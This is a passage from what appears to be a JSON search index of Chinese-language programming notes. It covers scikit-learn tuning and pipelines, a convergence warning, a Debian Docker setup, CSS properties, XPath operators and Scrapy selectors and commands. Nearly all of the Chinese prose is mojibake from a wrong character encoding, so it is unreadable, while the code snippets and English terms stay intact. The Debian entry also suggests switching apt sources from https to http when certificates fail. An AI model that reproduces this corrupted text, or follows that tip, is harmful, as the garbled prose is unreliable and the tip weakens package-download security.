è¡¨ç¤ºå™¨ï¼Œ æˆ‘ä»¬å¯ä»¥å°†æ ‘çš„ max_depth è®¾ç½®ä¸ºå¯èƒ½çš„ä»»ä½•å€¼ï¼Œ å¹¶ä¸”æ ¹æ®æ•°æ®å’Œä»»åŠ¡çš„ä¸åŒå€¼ï¼Œæ­¤å‚æ•°çš„ä¸åŒå€¼å°†äº§ç”Ÿä¸åŒçš„ç»“æœã€‚ è¿™ç§å°è¯•ä¸åŒå‚æ•°ç»„åˆä»¥æ‰¾åˆ°æœ€ä½³ç»„åˆçš„è¿‡ç¨‹ç§°ä¸ºè¶…å‚æ•°ä¼˜åŒ–ã€‚ Scikit-learn æä¾›äº†ä¸¤ä¸ªè‡ªåŠ¨æ‰§è¡Œæ­¤ä»»åŠ¡çš„å·¥å…·ï¼Œ GridSearchCV å®ç°äº†ä¸€ç§ç§°ä¸ºè¯¦å°½ç½‘æ ¼æœç´¢çš„æŠ€æœ¯ï¼Œä»¥åŠæ‰§è¡Œéšæœºå‚æ•°ä¼˜åŒ–çš„éšæœºæœç´¢ CVã€‚ ä¸‹é¢çš„ç¤ºä¾‹ä½¿ç”¨ GridSearchCV æŸ¥æ‰¾éšæœºæ£®æ—åˆ†ç±»å™¨çš„æœ€ä½³å‚æ•°ï¼Œè¾“å‡ºç»“æœåœ¨ä»£ç ä¸‹æ–¹: param_grid = { 'n_estimators': [200, 500], 'max_features': ['auto', 'sqrt', 'log2'], 'max_depth' : [4,5,6,7,8], 'criterion' :['gini', 'entropy'] } from sklearn.model_selection import GridSearchCV CV = GridSearchCV(rf, param_grid, n_jobs= 1) CV.fit(X_train, y_train) print(CV.best_params_) print(CV.best_score_) ç®¡é“ Scikit-learn åŒ…ä»¥ç®¡é“çš„å½¢å¼æä¾›äº†ä¸€ç§æ›´åŠ æ–¹ä¾¿çš„ä»£ç å°è£…å½¢å¼ã€‚ æ­¤å·¥å…·å…è®¸å°†æ‰€æœ‰é¢„å¤„ç†ä»»åŠ¡ä¸åˆ†ç±»å™¨æ­¥éª¤è¿æ¥åœ¨ä¸€èµ·ï¼Œ ä»¥ä¾¿ç®€å•åœ°åœ¨å•ä¸ªç®¡é“å¯¹è±¡ä¸Šè°ƒç”¨ fitï¼ˆï¼‰ æˆ– predictï¼ˆï¼‰ æ‰§è¡Œå·¥ä½œæµä¸­çš„æ‰€æœ‰æ­¥éª¤ã€‚ è¿™æ ·å¯ä»¥ç”Ÿæˆé«˜å¯è¯»ä»£ç ï¼Œå¹¶å‡å°‘æœºå™¨å­¦ä¹ å·¥ä½œæµä¸­æ­¥éª¤çš„é‡å¤ã€‚ ä¸ºäº†åˆ›å»ºç®¡é“ï¼Œæˆ‘ä»¬é¦–å…ˆåœ¨ä¸‹é¢çš„ä»£ç ä¸­å®šä¹‰æˆ‘ç§°ä¹‹ä¸ºç®¡é“çš„å¯¹è±¡ä¸­çš„æ­¥éª¤ã€‚ ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°è°ƒç”¨æ­¤å¯¹è±¡çš„æ‹Ÿåˆæ¥è®­ç»ƒæ¨¡å‹ã€‚æ­¤å¤–ï¼Œç®¡é“å¯¹è±¡è¿˜å¯ç”¨äºå¯¹æ–°æ•°æ®è¿›è¡Œé¢„æµ‹: from sklearn.pipeline import Pipeline pipe = Pipeline([('imputer', SimpleImputer()), ('rf', RandomForestClassifier())]) pipeline_model = pipe.fit(X_train, y_train) pipeline_model.score(X_test, y_test)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-Simple-use-tutorial.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-Simple-use-tutorial.html"},{"title":"lbfgs failed to converge","text":"å®Œæ•´æŠ¥é”™ä¿¡æ¯: /Users/yanque/Project/Code/Pycharm/StudyPytorch/.venv/lib/python3.10/site-packages/sklearn/linear_model/_logistic.py:469: ConvergenceWarning: lbfgs failed to converge (status=1): STOP: TOTAL NO. of ITERATIONS REACHED LIMIT. Increase the number of iterations (max_iter) or scale the data as shown in: https://scikit-learn.org/stable/modules/preprocessing.html Please also refer to the documentation for alternative solver options: https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression n_iter_i = _check_optimize_result( è¿™æ˜¯è¯´è®­ç»ƒæ¨¡å‹çš„æ—¶å€™ï¼Œå‚æ•°çš„è¿­ä»£æ¬¡æ•°è¾¾åˆ°äº†é™åˆ¶ï¼ˆé»˜è®¤ max_iter=100ï¼‰ï¼Œ ä½†æ˜¯ä¸¤æ¬¡è¿­ä»£å‚æ•°å˜åŒ–è¿˜æ˜¯æ¯”è¾ƒå¤§ï¼Œä»ç„¶æ²¡æœ‰åœ¨ä¸€ä¸ªå¾ˆå°çš„é˜ˆå€¼ä»¥ä¸‹ï¼Œè¿™å°±å«æ²¡æœ‰æ”¶æ•›ã€‚ ä¸è¿‡ï¼Œè¿™åªæ˜¯ä¸€ä¸ªè­¦å‘Šï¼ˆæ¸©é¦¨æç¤ºï¼‰è€Œå·²ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹© å¿½ç•¥. å¦‚ä»£ç æ˜¾ç¤ºå¿½ç•¥: import warnings; warnings.filterwarnings(\"ignore\") å¢å¤§æœ€å¤§è¿­ä»£æ¬¡æ•°, å¦‚: LogisticRegression(max_iter=1000) æ›´æ¢å…¶ä»–çš„æ¨¡å‹æˆ–è€…é‚£ä¸ªå‚æ•° solver, å¦‚: LogisticRegression(solver=\"sag\") å°†æ•°æ®è¿›è¡Œé¢„å¤„ç†ï¼Œæå–æ›´æœ‰ç”¨çš„ç‰¹å¾","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-question-lbfgs-failed-to-converge.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-question-lbfgs-failed-to-converge.html"},{"title":"ipconfig","text":"æŸ¥çœ‹ç½‘ç»œä¿¡æ¯","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-ipconfig.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-ipconfig.html"},{"title":"genisoimage","text":"å®‰è£…: apt install genisoimage ä½¿ç”¨: geteltorito -o output_file.iso input_file.img","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GenisoImage.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GenisoImage.html"},{"title":"é…ç½®docker-debian","text":"æ‹‰å–debiané•œåƒ: docker pull debian è¿è¡Œ: docker run --name mydebian -dit debian è¿›å…¥: docker exec -it mydebian /bin/bash å®‰è£…éªŒè¯å·¥å…·(HTTPS): sudo apt install apt-transport-https ca-certificates æ¢æº: mv /etc/apt/sources.list /etc/apt/sources.list.bak echo \"# é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-updates main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-updates main contrib non-free deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-backports main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-backports main contrib non-free # deb https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free # # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free deb https://security.debian.org/debian-security bullseye-security main contrib non-free # deb-src https://security.debian.org/debian-security bullseye-security main contrib non-free \" > /etc/apt/sources.list apt update æ¸…åæºåœ°å€debiané…ç½®å¸®åŠ©: debian æ³¨è§£ å¦‚æœæŠ¥é”™ Certificate verification failed: The certificate is NOT trusted. æœ‰ä¸¤ç§è§£å†³æ–¹å¼ å°† https æ”¹æˆ http å…ˆå®‰è£… apt-transport-https ca-certificates","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-Configure-DEBIAN-container.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-Configure-DEBIAN-container.html"},{"title":"opacity","text":"è®¾ç½®å…ƒç´ é€æ˜åº¦ opacity å±æ€§æ§åˆ¶å…ƒç´ çš„ä¸é€æ˜åº¦çº§åˆ«ï¼Œ å…¶å€¼èŒƒå›´ä» 0 åˆ° 1ï¼Œ 0 è¡¨ç¤ºå®Œå…¨é€æ˜ï¼ˆä¸å¯è§ï¼‰ï¼Œ 1 è¡¨ç¤ºå®Œå…¨ä¸é€æ˜ï¼ˆå®Œå…¨å¯è§ï¼‰ã€‚ å°†å…ƒç´ è®¾ç½®ä¸ºåŠé€æ˜ï¼ˆé€æ˜åº¦ä¸º 0.5ï¼‰: .element { opacity: 0.5; } æ³¨è§£ æœ‰æ—¶å€™ä¸è®¾ç½®èƒŒæ™¯, èƒŒæ™¯è‡ªåŠ¨å°±æ˜¯é€æ˜çš„","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-OPACITY.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-OPACITY.html"},{"title":"outline","text":"CSS çš„ outline å±æ€§ç”¨äºè®¾ç½®å…ƒç´ çš„è½®å»“æ ·å¼ï¼Œå®ƒæ˜¯ä¸€ç§åœ¨å…ƒç´ å‘¨å›´ç»˜åˆ¶è½®å»“çº¿çš„è£…é¥°æ•ˆæœã€‚ è½®å»“çº¿ä½äºå…ƒç´ çš„è¾¹æ¡†ä¹‹å¤–ï¼Œå¹¶ä¸”ä¸å æ®å¸ƒå±€ç©ºé—´ã€‚ outline å±æ€§å¯ä»¥æ¥å—å¤šä¸ªå€¼ï¼ŒåŒ…æ‹¬ï¼š outline-width ç”¨äºè®¾ç½®è½®å»“çº¿çš„å®½åº¦ã€‚å¯ä»¥ä½¿ç”¨å…·ä½“çš„é•¿åº¦å€¼ï¼ˆå¦‚åƒç´ æˆ– emï¼‰æˆ–é¢„å®šä¹‰çš„å€¼ï¼ˆå¦‚ thinã€mediumã€thickï¼‰ã€‚ outline-style ç”¨äºè®¾ç½®è½®å»“çº¿çš„æ ·å¼ï¼Œå¯ä»¥æ˜¯å®çº¿ï¼ˆsolidï¼‰ã€è™šçº¿ï¼ˆdottedï¼‰ã€åŒå®çº¿ï¼ˆdoubleï¼‰ç­‰ã€‚ outline-color ç”¨äºè®¾ç½®è½®å»“çº¿çš„é¢œè‰²ï¼Œå¯ä»¥æ˜¯å…·ä½“çš„é¢œè‰²å€¼ï¼ˆå¦‚åå…­è¿›åˆ¶ã€RGBã€é¢œè‰²åç§°ï¼‰ã€‚ é€‰æ‹©æ‰€æœ‰çš„ <div> å…ƒç´ ï¼Œå¹¶ä¸ºå…¶è®¾ç½®äº†ä¸€ä¸ªçº¢è‰²çš„ 2 åƒç´ ç²—çš„å®çº¿è½®å»“: div { outline: 2px solid red; } ä½¿ç”¨ outline å±æ€§æ—¶ï¼Œé€šå¸¸ä¼šåŒæ—¶è®¾ç½® outline-widthã€outline-style å’Œ outline-color çš„å€¼ï¼Œä½†ä¹Ÿå¯ä»¥å•ç‹¬ä½¿ç”¨å…¶ä¸­çš„æŸä¸ªå±æ€§ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œoutline å±æ€§æ˜¯ä¸€ä¸ªè£…é¥°æ€§çš„æ•ˆæœï¼Œä¸åŒäº border å±æ€§ï¼Œå®ƒä¸å æ®å¸ƒå±€ç©ºé—´ã€‚ æ­¤å¤–ï¼Œoutline å±æ€§åœ¨æŸäº›æµè§ˆå™¨ä¸­å¯èƒ½ä¼šæ˜¾ç¤ºä¸åŒçš„æ•ˆæœæˆ–ä¸æ”¯æŒæŸäº›å±æ€§å€¼ï¼Œå› æ­¤åœ¨ä½¿ç”¨æ—¶éœ€è¦è¿›è¡Œå…¼å®¹æ€§æµ‹è¯•ã€‚ æ³¨è§£ æºäº AI è½®å»“ï¼ˆoutlineï¼‰å’Œè¾¹æ¡†ï¼ˆborderï¼‰åŒºåˆ« ä½ç½® è¾¹æ¡†ä½äºå…ƒç´ çš„å†…å®¹åŒºåŸŸå’Œå†…è¾¹è·ä¹‹é—´ï¼Œè€Œè½®å»“åˆ™ä½äºè¾¹æ¡†ä¹‹å¤–ã€‚æ¢å¥è¯è¯´ï¼Œè¾¹æ¡†æ˜¯å›´ç»•åœ¨å…ƒç´ çš„å†…å®¹å‘¨å›´çš„çº¿æ¡ï¼Œè€Œè½®å»“æ˜¯åœ¨è¾¹æ¡†å¤–é¢ç»˜åˆ¶çš„çº¿æ¡ã€‚ å æ®ç©ºé—´ è¾¹æ¡†ä¼šå æ®å…ƒç´ çš„å¸ƒå±€ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä¼šå½±å“å…ƒç´ çš„å°ºå¯¸å’Œä½ç½®ã€‚è€Œè½®å»“ä¸ä¼šå æ®å¸ƒå±€ç©ºé—´ï¼Œå®ƒåªæ˜¯ä¸€ç§è§†è§‰æ•ˆæœï¼Œå¹¶ä¸ä¼šæ”¹å˜å…ƒç´ çš„å¤§å°æˆ–å¸ƒå±€ã€‚ æ ·å¼å’Œå±æ€§ è¾¹æ¡†å…·æœ‰æ›´å¤šçš„æ ·å¼å’Œå±æ€§é€‰é¡¹ï¼Œå¯ä»¥è®¾ç½®è¾¹æ¡†çš„å®½åº¦ã€æ ·å¼å’Œé¢œè‰²ï¼Œå¯ä»¥åˆ†åˆ«è®¾ç½®å››ä¸ªæ–¹å‘çš„è¾¹æ¡†ã€‚è€Œè½®å»“çš„æ ·å¼ç›¸å¯¹è¾ƒå°‘ï¼Œé€šå¸¸åªè®¾ç½®è½®å»“çš„å®½åº¦ã€æ ·å¼å’Œé¢œè‰²ã€‚ å…¼å®¹æ€§ è¾¹æ¡†æ˜¯ CSS 2.1 è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œå¾—åˆ°äº†å¹¿æ³›çš„æµè§ˆå™¨æ”¯æŒã€‚è€Œè½®å»“æ˜¯ CSS2.1 è§„èŒƒä¸­å¼•å…¥çš„ï¼Œä¸åŒæµè§ˆå™¨å¯¹äºè½®å»“çš„æ ·å¼å’Œè¡Œä¸ºå¯èƒ½æœ‰æ‰€å·®å¼‚ï¼Œå› æ­¤åœ¨ä½¿ç”¨è½®å»“æ—¶éœ€è¦è¿›è¡Œå…¼å®¹æ€§æµ‹è¯•ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-outline.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-outline.html"},{"title":"XPath è¿ç®—ç¬¦","text":"XPath è¡¨è¾¾å¼å¯è¿”å›èŠ‚ç‚¹é›†ã€å­—ç¬¦ä¸²ã€é€»è¾‘å€¼ä»¥åŠæ•°å­—ã€‚ XPath è¿ç®—ç¬¦ ä¸‹é¢åˆ—å‡ºäº†å¯ç”¨åœ¨ XPath è¡¨è¾¾å¼ä¸­çš„è¿ç®—ç¬¦ï¼š è¿ç®—ç¬¦ æè¿° å®ä¾‹ è¿”å›å€¼ | è®¡ç®—ä¸¤ä¸ªèŠ‚ç‚¹é›† //book | //cd è¿”å›æ‰€æœ‰æ‹¥æœ‰ book å’Œ cd å…ƒç´ çš„èŠ‚ç‚¹é›† + åŠ æ³• 6 + 4 10 - å‡æ³• 6 - 4 2 * ä¹˜æ³• 6 * 4 24 div é™¤æ³• 8 div 4 2 = ç­‰äº price=9.80 å¦‚æœ price æ˜¯ 9.80ï¼Œåˆ™è¿”å› trueã€‚ å¦‚æœ price æ˜¯ 9.90ï¼Œåˆ™è¿”å› falseã€‚ != ä¸ç­‰äº price!=9.80 å‡ ä¹åŒä¸Š < å°äº price<9.80 å‡ ä¹åŒä¸Š <= å°äºæˆ–ç­‰äº price<=9.80 å‡ ä¹åŒä¸Š > å¤§äº price>9.80 å‡ ä¹åŒä¸Š >= å¤§äºæˆ–ç­‰äº price>=9.80 å‡ ä¹åŒä¸Š or æˆ– price=9.80 or price=9.70 å‡ ä¹åŒä¸Š and ä¸ price>9.00 and price<9.90 å‡ ä¹åŒä¸Š mod è®¡ç®—é™¤æ³•çš„ä½™æ•° 5 mod 2 1 contains åŒ…å«, ä¸»è¦ç”¨äºå±æ€§ contains(@class, \"c2\") ä»¥ä¸ºä¾‹: <div class=\"c2 c3\">Direct Child Div 1</div> è¡¨ç¤ºåŒ¹é… class åŒ…å« c2 count å­å…ƒç´ æ•°é‡ count(a) aæ ‡ç­¾æ•°é‡ containçš„ä½¿ç”¨ å¦‚: *[contains(concat(' ', normalize-space(@class), ' '), ' someclass ')] è·å–class åŒ…å« someclassçš„å…ƒç´  æœ€ç¹ç @class='someclass' è·å–class ä»…ä¸º someclassçš„å…ƒç´  å¯èƒ½ä¼šæ¼é€‰ contains(@class, 'someclass') è·å–class åŒ…å« someclassçš„å…ƒç´  ä½†æ˜¯å¯èƒ½ä¼šå¤šé€‰ä¸€äº›å…ƒç´ ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-Xpath-operator.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-Xpath-operator.html"},{"title":"Response","text":"ä½ç½®: from scrapy.http import Response å¯¹è±¡æ–¹æ³• css(è¡¨è¾¾å¼): /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/API/SelectorList æ ¹æ®è¡¨è¾¾å¼è·å–å¯¹åº”çš„ CSS å…ƒç´ , å¯ä»¥ç†è§£ä¸ºä¸€ä¸ª CSS é€‰æ‹©å™¨ è¿”å› /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/API/SelectorList å¦‚è·å– title æ ‡ç­¾å…ƒç´ : # html <title>æ ‡é¢˜</title> # å…ƒç´  response.css(\"title\") # æ–‡æœ¬ response.css(\"title::text\") è¯¦è§ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/API/SelectorList é€‰æ‹©å™¨æ”¯æŒè§ ../é€‰æ‹©å™¨/index xpath(è¡¨è¾¾å¼): /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/API/SelectorList ä½¿ç”¨ /docs/åç«¯/python/æ•™ç¨‹/xpath/index è·å–å…ƒç´ , è¿”å› /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/API/SelectorList","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-Response.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-Response.html"},{"title":"SelectorList","text":"/docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/API/Selector æœ‰çš„å¯¹è±¡æ–¹æ³•, å¥½åƒå®ƒä¹Ÿæœ‰. å¯¹è±¡æ–¹æ³• get(default=\"\"): str | None è·å–ç¬¬ä¸€ä¸ªå…ƒç´ çš„data getall(): [str] è·å–æ‰€æœ‰æŸ¥è¯¢åˆ°çš„åˆ—è¡¨selectorçš„data re(args) å¯¹æ•°æ®é›†çš„data, è¿›è¡Œæ­£åˆ™æŸ¥è¯¢ attrib[\"src\"] ä¸ä½¿ç”¨ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/é€‰æ‹©å™¨/index è·å–å±æ€§ è€Œæ˜¯ç›´æ¥ä½¿ç”¨å®ä¾‹æ–¹æ³•è·å–å±æ€§: response.css(\"img\").attrib[\"src\"] # å³ img::attr(src) # æˆ– //img/@src extract_first() ä¸ get ä¸€è‡´, ä¸»è¦æ˜¯ä¸ºäº†å…¼å®¹å…¶ä»–çš„(å…¶ä»–æ¡†æ¶æœ‰è¿™ä¸ª), ä¸‹åŒ extract() ä¸ getall ä¸€è‡´","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-SelectOmerist.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-SelectOmerist.html"},{"title":"Selector","text":"å‚è€ƒ: https://docs.scrapy.org/en/latest/topics/selectors.html#scrapy.selector.SelectorList code: class scrapy.selector.Selector(*args: Any, **kwargs: Any) ç”¨äºä¿®é¥° response é€‰æ‹©å™¨é€‰æ‹©çš„å†…å®¹. response æ˜¯ HtmlResponse/XmlResponse å¯¹è±¡ æ”¯æŒå‚æ•°: text HTML/XML å­—ç¬¦ä¸² type é€‰æ‹©å™¨ç±»å‹, æ”¯æŒ html å’Œ xml. ä¸ç»™ä¼šè‡ªåŠ¨é€‰æ‹©æœ€é€‚åˆçš„ æ”¯æŒçš„: \"html\" for HtmlResponse type \"xml\" for XmlResponse type \"html\" for anything else è®¾ç½®åå°±ä¸ä¼šè‡ªåŠ¨æ‰¾ å±æ€§ selector å¯¹è±¡æ–¹æ³• css(è¡¨è¾¾å¼): /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/API/SelectorList æ ¹æ®è¡¨è¾¾å¼è·å–å¯¹åº”çš„ CSS å…ƒç´ , å¯ä»¥ç†è§£ä¸ºä¸€ä¸ª CSS é€‰æ‹©å™¨ è¿”å› /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/API/SelectorList å¦‚è·å– title æ ‡ç­¾å…ƒç´ : # html <title>æ ‡é¢˜</title> # å…ƒç´  response.css(\"title\") # æ–‡æœ¬ response.css(\"title::text\") é€‰æ‹©å™¨æ”¯æŒè§ ../é€‰æ‹©å™¨/index å¦‚æœè¦è·å–å±æ€§, æ¯”å¦‚ <a href=\"xxx\"/> æœ‰ä¸¤ç§æ–¹å¼: response.css(\"a\").attrib[\"href\"] response.css(\"a::attr('href')\") xpath(è¡¨è¾¾å¼): /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/API/SelectorList ä½¿ç”¨ /docs/åç«¯/python/æ•™ç¨‹/xpath/index è·å–å…ƒç´ , è¿”å› /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/API/SelectorList æ–¹æ³•: xpath(query: str, namespaces: Optional[Mapping[str, str]] = None, **kwargs: Any)â†’ SelectorList[_SelectorType] å¦‚: >>> t = response.xpath(\"//div[@class='tea_con']/div/ul/li\")[0] >>> t <Selector query=\"//div[@class='tea_con']/div/ul/li\" data='<li>\\n\\t\\t\\t\\t\\t<img src=\"images/teacher/ja...'> >>> >>> t.xpath(\"div/h4\") [<Selector query='div/h4' data='<h4>é«˜çº§è®²å¸ˆ</h4>'>] >>> æ³¨æ„, æ–°çš„ xpath è¡¨è¾¾å¼, å¦‚æœä¸å¸¦æ–œæ , è¡¨ç¤ºæ˜¯ä»ä¸Šä¸€çº§ç»§ç»­æ‰¾, æ¯”å¦‚ä¾‹å­ t.xpath(\"div/h4\") å°±æ˜¯ä»ä¸Šé¢çš„ query ç»§ç»­æ‰¾: //div[@class='tea_con']/div/ul/li/div/h4 ä½†æ˜¯å¦‚æœæœ‰æ–œæ , ä¸Šä¸€å±‚çš„queryå°±æ²¡äº†(å› ä¸ºä¼šè§†ä½œç»å¯¹è·¯å¾„). å¦‚æœéè¦ç”¨é‹æ , éœ€è¦åŠ ç‚¹: .//div/h4 è¡¨ç¤ºæ‰¾ç›¸å¯¹è·¯å¾„ åŒ…å«ä½¿ç”¨ contains: contains(@class, \"c1\") å¯å‚è€ƒ /docs/åç«¯/python/æ•™ç¨‹/xpath/XPathè¿ç®—ç¬¦","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-Selector.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-Selector.html"},{"title":"genspider","text":"ä¸ä¾èµ–é¡¹ç›®ç›®å½• ç”Ÿæˆä¸€ä¸ªçˆ¬è™«æ–‡ä»¶. å¦‚æœå½“å‰ä½ç½®æ˜¯éé¡¹ç›®ç›®å½•, ç”Ÿæˆåˆ°å½“å‰ç›®å½•ä¸‹. å¦‚æœå½“å‰ä½ç½®æ˜¯é¡¹ç›®ç›®å½•, ç”Ÿæˆåˆ° spiders ç›®å½•. è¯­æ³•: scrapy genspider [-t template] <name> <domain or URL> name è®¾ç½®çˆ¬è™«çš„ name å±æ€§, æ–‡ä»¶åä¹Ÿæ˜¯è¿™ domain or URL å¯é€‰. å¦‚æœæŒ‡å®šäº†, ä¼šåœ¨çˆ¬è™«ç±»ç”Ÿæˆ allowed_domains å’Œ start_urls å±æ€§ -t template æŒ‡å®šç”Ÿæˆæ—¶ä½¿ç”¨çš„æ¨¡ç‰ˆ. å¦‚: $ scrapy genspider -l Available templates: basic crawl csvfeed xmlfeed $ scrapy genspider example example.com Created spider 'example' using template 'basic' $ scrapy genspider -t crawl scrapyorg scrapy.org Created spider 'scrapyorg' using template 'crawl' æ¯”å¦‚åˆ›å»ºä¸€ä¸ª åä¸º mydomain çš„çˆ¬è™«, çˆ¬å– mydomain åœ°å€: scrapy genspider mydomain mydomain.com","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Genspider.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Genspider.html"},{"title":"parse","text":"ä¾èµ–é¡¹ç›®ç›®å½• è¯­æ³•: scrapy parse <url> [options] è·å–æŒ‡å®šçš„ URL æ•°æ®, å¹¶ä½¿ç”¨ parse å‡½æ•°è¿›è¡Œè½¬æ¢. æ”¯æŒé€‰é¡¹ --spider= SPIDER æŒ‡å®šçˆ¬è™«, ä¼šè‡ªåŠ¨æ£€æµ‹url --a args è®¾å®šæ‰§è¡Œçš„å‚æ•° æ ¼å¼: --a [NAME=VALUE] --callback , -c å›è°ƒæ–¹æ³•, é»˜è®¤ä½¿ç”¨ parse å‡½æ•° --meta , -m é¢å¤–æä¾›ç»™ å›è°ƒæ–¹æ³• çš„å‚æ•°. å¿…é¡»æ˜¯jsonæ ¼å¼ Example: â€“meta='{\"foo\" : \"bar\"}' --cbkwargs é¢å¤–æä¾›ç»™ å›è°ƒå‡½æ•° çš„ å…³é”®å­—å‚æ•° Example: â€“cbkwargs='{\"foo\" : \"bar\"}' --pipelines process items through pipelines --rules , -r ä½¿ç”¨ CrawlSpider è§„åˆ™å‘ç° å›è°ƒå‡½æ•°. æ²¡å¤§æ‡‚, åŸæ–‡: use CrawlSpider rules to discover the callback (i.e. spider method) to use for parsing the response --noitems don't show scraped items --nolinks don't show extracted links --nocolour é¿å…å­˜åœ¨é¢œè‰²è¾“å‡º. avoid using pygments to colorize the output --depth , -d è¯·æ±‚æœ€å¤šè¢«é€’å½’è°ƒç”¨å¤šå°‘æ¬¡. é»˜è®¤1. depth level for which the requests should be followed recursively (default: 1) --verbose , -v è¾“å‡ºæ¯ä¸€ä¸ªè°ƒç”¨è¯¦æƒ…. display information for each depth level --output , -o å°†ç»“æœè¾“å‡ºåˆ°æ–‡ä»¶. dump scraped items to a file New in version 2.3. Usage example: $ scrapy parse http://www.example.com/ -c parse_item [ ... scrapy log lines crawling example.com spider ... ] >>> STATUS DEPTH LEVEL 1 <<< # Scraped Items ------------------------------------------------------------ [{'name': 'Example item', 'category': 'Furniture', 'length': '12 cm'}] # Requests ----------------------------------------------------------------- []","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Parse.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Parse.html"},{"title":"settings","text":"ä¸ä¾èµ–é¡¹ç›®ç›®å½• è¯­æ³•: scrapy settings [options] è·å–é…ç½®ä¿¡æ¯ å¦‚æœåœ¨é¡¹ç›®ä¸‹, è¾“å‡ºé¡¹ç›®çš„é…ç½® ä¸åœ¨é¡¹ç›®è¾“å‡ºé»˜è®¤é…ç½® Example usage: $ scrapy settings --get BOT_NAME scrapybot $ scrapy settings --get DOWNLOAD_DELAY 0","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Settings.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Settings.html"},{"title":"view","text":"ä¸ä¾èµ–é¡¹ç›®ç›®å½• ç”¨æµè§ˆå™¨æ‰“å¼€æŒ‡å®šçš„ url è¯­æ³•: scrapy view <url> é€‰é¡¹ --spider= SPIDER è‡ªåŠ¨æ¢æµ‹æŒ‡å®šçˆ¬è™«çš„url --no-redirect ä¸é‡å®šå‘ Usage example: $ scrapy view http://www.example.com/some/page.html [ ... browser starts ... ]","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-VIEW.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-VIEW.html"},{"title":"bench","text":"ä¸ä¾èµ–é¡¹ç›®ç›®å½• è¯­æ³•: scrapy bench Run a quick benchmark test. Benchmarking. ç¿»è¯‘: è¿è¡Œä¸€ä¸ªå¿«é€ŸåŸºå‡†æµ‹è¯•ã€‚æ ‡æ†","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-bench.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-bench.html"},{"title":"check","text":"ä¾èµ–é¡¹ç›®ç›®å½• è¯­æ³•: scrapy check [-l] <spider> è¿è¡Œæ£€æŸ¥: $ scrapy check -l first_spider * parse * parse_item second_spider * parse 